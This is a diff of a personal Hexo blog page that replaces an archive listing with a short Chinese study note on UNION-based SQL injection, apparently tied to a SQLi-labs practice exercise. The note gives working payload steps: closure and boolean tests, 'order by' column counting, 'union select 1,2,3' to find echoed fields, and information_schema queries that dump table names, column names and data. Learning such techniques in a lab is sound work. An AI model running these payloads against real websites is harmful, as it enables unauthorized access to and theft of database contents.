@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   
-  <title>我的技术与生活——小站首页 | Hexo</title>
+  <title>我的技术与生活——union注入 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
   <link rel="stylesheet" href="/css/public.css" />
@@ -16,7 +16,7 @@
 
   <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
   <script>
-    document.title = `我的技术与生活——小站首页`
+    document.title = `我的技术与生活——union注入`
   </script>
 <meta name="generator" content="Hexo 7.3.0"></head>
 
@@ -344,128 +344,151 @@
     </div>
   </div>
 </div></div>
-      <div id="main-container" class="main-container"><link rel="stylesheet" href="/css/partial/archive.css" />
+      <div id="main-container" class="main-container">
 
 
+  <link rel="stylesheet" href="/css/partial/article.css" />
 
-    <div class="archive">
-        <h1 class="archive-title">我の博客归档记录</h1>
-        <ul class="archive-list">
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">union注入</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
             
-                <li class="archive-list__year">
-                    <h2>2024年</h2>
-                    <ul>
-                        
-                            <li class="archive-list__month">
-                                <h3>第08の月</h3>
-                                <ul>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2024/08/21/How-to-build-up-a-blog-site-using-Hexo-and-Guithub-Pages/">How to build up a blog site using Hexo and Guithub Pages</a>
-                                                <span>08月21日</span>
-                                            </div>
-                                        </li>
-                                    
-                                </ul>
-                            </li>
-                        
-                            <li class="archive-list__month">
-                                <h3>第09の月</h3>
-                                <ul>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2024/09/28/hello-world/">Hello World</a>
-                                                <span>09月28日</span>
-                                            </div>
-                                        </li>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2024/09/15/虚拟机搭建/">虚拟机搭建</a>
-                                                <span>09月15日</span>
-                                            </div>
-                                        </li>
-                                    
-                                </ul>
-                            </li>
-                        
-                    </ul>
-                </li>
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
             
-                <li class="archive-list__year">
-                    <h2>2025年</h2>
-                    <ul>
-                        
-                            <li class="archive-list__month">
-                                <h3>第10の月</h3>
-                                <ul>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2025/10/05/php/">php</a>
-                                                <span>10月05日</span>
-                                            </div>
-                                        </li>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2025/10/05/post型union/">post型union</a>
-                                                <span>10月05日</span>
-                                            </div>
-                                        </li>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2025/10/10/sql/">sql</a>
-                                                <span>10月10日</span>
-                                            </div>
-                                        </li>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2025/10/04/union注入/">union注入</a>
-                                                <span>10月04日</span>
-                                            </div>
-                                        </li>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2025/10/10/报文/">报文</a>
-                                                <span>10月10日</span>
-                                            </div>
-                                        </li>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2025/10/04/报错注入/">报错注入</a>
-                                                <span>10月04日</span>
-                                            </div>
-                                        </li>
-                                    
-                                </ul>
-                            </li>
-                        
-                            <li class="archive-list__month">
-                                <h3>第09の月</h3>
-                                <ul>
-                                    
-                                        <li class="archive-list__post">
-                                            <div>
-                                                <a href="/2025/09/19/VScode/">VScode</a>
-                                                <span>09月19日</span>
-                                            </div>
-                                        </li>
-                                    
-                                </ul>
-                            </li>
-                        
-                    </ul>
-                </li>
-            
-        </ul>
+          </div>
+          
+          <p class="article-info--date">日期：2025-10-04 00:04:56</p>
+        </div>
+        <img src="/imgs/default-cover.webp" alt="" class="article-cover">
+      </div>
     </div>
+    <article class="article-content markdown-body">
+      <h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><pre><code> 1.查找注入点（?id=1）
+ 2.判断是字符型还是数字型
+ 
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>,<span class="number">1</span><span class="operator">=</span><span class="number">2</span><span class="operator">/</span><span class="number">2</span><span class="number">-1</span></span><br></pre></td></tr></table></figure>
+ 
+ 3.如果是字符型，找他的闭合方式（‘“/--+可以注释掉后面的部分）
+ 4.判断查询列数
+ 
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">group</span> <span class="keyword">by</span><span class="operator">/</span><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>
+ 
+ 5.查询回显位置(id改成不存在的数字)
+ 
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span>‘ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
+ 
+ imformation_schema（数据库）包含两个数据表tables（表名），columns（列名）
+ 
+</code></pre>
+<h1 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h1><pre><code>  数据库information_schema中的数据表tables下数据列table_name和数据表columns下数据列column_name
+
+  1.查表名
+  
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat（table_name）,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+ 
+  2.查列名
+  
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat（column_name）,<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+  3.
+  
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(所显示的列名),<span class="number">3</span> <span class="keyword">from</span> 所需要的表名</span><br></pre></td></tr></table></figure>
+</code></pre>
+<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><pre><code> group_concat():把查询到的结果合并到一行显示
+</code></pre>
+<p><img src="https://github.com/Lin060807/images/raw/main/Less-1.png" alt="Less-1"></p>
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2025/10/04/union注入/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
+    
+  </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.</span> <span class="toc-text">注入步骤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#union%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">union注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">3.</span> <span class="toc-text">补充</span></a></li></ol>
+      </div>
+      
+        <div class="catelogue catelogue-2">
+          
+            <p>
+              <span>上一篇：</span>
+              <a href="/2025/10/04/报错注入/">报错注入</a>
+            </p>
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2025/09/19/VScode/">VScode</a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '2025/10/04/union注入/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
+
 </div>
       <div class="main-right-wrapper"><div class="main-right">
   <div class="main-right--board">
